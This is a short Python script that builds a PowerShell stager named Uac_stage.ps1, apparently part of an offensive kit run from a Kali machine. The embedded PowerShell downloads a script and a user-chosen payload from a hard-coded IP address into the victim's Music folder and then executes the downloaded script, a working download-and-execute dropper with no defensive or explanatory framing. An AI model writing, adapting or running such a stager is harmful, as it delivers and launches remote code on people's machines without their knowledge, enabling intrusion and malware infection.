import sys
import os

def replace_filename(code, filename):
    return code.replace("{filename}", filename)

def main():
    if len(sys.argv) != 2:
        print("Usage: python program.py <filename>")
        return

    name = sys.argv[1]

    code = r'''
$down = New-Object System.Net.WebClient
$url  = 'http://54.208.157.120:80/Scam_uac/Uac_main.ps1'
$file = "c:\Users\$env:USERNAME\Music\Uac_main.ps1"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://54.208.157.120:80/Scam_uac/payloads/{filename}'
$file = "c:\Users\$env:USERNAME\Music\{filename}"
$down.DownloadFile($url, $file);

powershell c:\Users\$env:USERNAME\Music\Uac_main.ps1
    '''

    modified_code = replace_filename(code, name)
    output_folder = '/home/kali/Scam_uac'
    os.makedirs(output_folder, exist_ok=True)
    output_file = os.path.join(output_folder, "Uac_stage.ps1")
    with open(output_file, "w") as file:
        file.write(modified_code)

if __name__ == "__main__":
    main()

